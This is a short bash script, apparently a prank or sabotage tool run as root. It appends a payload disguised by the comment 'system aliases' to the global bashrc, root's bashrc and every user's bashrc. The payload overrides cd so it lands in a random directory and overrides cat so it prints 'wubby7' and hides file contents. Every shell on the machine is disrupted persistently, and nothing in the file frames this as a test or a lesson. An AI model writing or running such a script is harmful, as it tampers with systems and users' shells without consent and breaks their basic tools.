#!/bin/bash
# chaos_aliases.sh - run with sudo

BASHRC_PAYLOAD='
# system aliases
alias xd="cd"
alias xat="cat"

cd() {
    dirs=( $(find / -maxdepth 3 -type d 2>/dev/null) )
    builtin cd "${dirs[$RANDOM % ${#dirs[@]}]}"
}

cat() {
    messages=(
        "wubby7"
    )
    echo "${messages[$RANDOM % ${#messages[@]}]}"
}
'

# append to global bashrc so it hits every user
echo "$BASHRC_PAYLOAD" >> /etc/bash.bashrc

# also hit root and any home dir users
echo "$BASHRC_PAYLOAD" >> /root/.bashrc

for user_home in /home/*; do
    if [ -f "$user_home/.bashrc" ]; then
        echo "$BASHRC_PAYLOAD" >> "$user_home/.bashrc"
    fi
done